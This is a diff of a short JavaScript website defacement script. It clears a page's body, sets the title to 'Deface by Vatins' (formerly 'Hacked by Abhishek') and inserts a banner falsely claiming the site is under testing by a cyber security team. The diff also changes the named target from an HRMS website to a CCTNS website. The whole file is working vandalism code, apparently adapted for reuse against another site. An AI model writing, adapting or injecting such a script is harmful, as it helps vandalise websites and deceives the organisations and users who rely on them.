@@ -2,7 +2,7 @@
 document.body.innerHTML = "";
 
 // Set the document title
-document.title = "Hacked by Abhishek";
+document.title = "Deface by Vatins";
 
 // Create and append new elements
 var newHeader = document.createElement('h1');
@@ -10,7 +10,7 @@ newHeader.textContent = "This website is under testing of Cyber Security Team !\
 document.body.appendChild(newHeader);
 
 var newParagraph = document.createElement('p');
-newParagraph.textContent = "Welcome to the new version of the HRMS website.";
+newParagraph.textContent = "Welcome to the new version of the CCTNS website.";
 document.body.appendChild(newParagraph);
 
 // Create and append the image
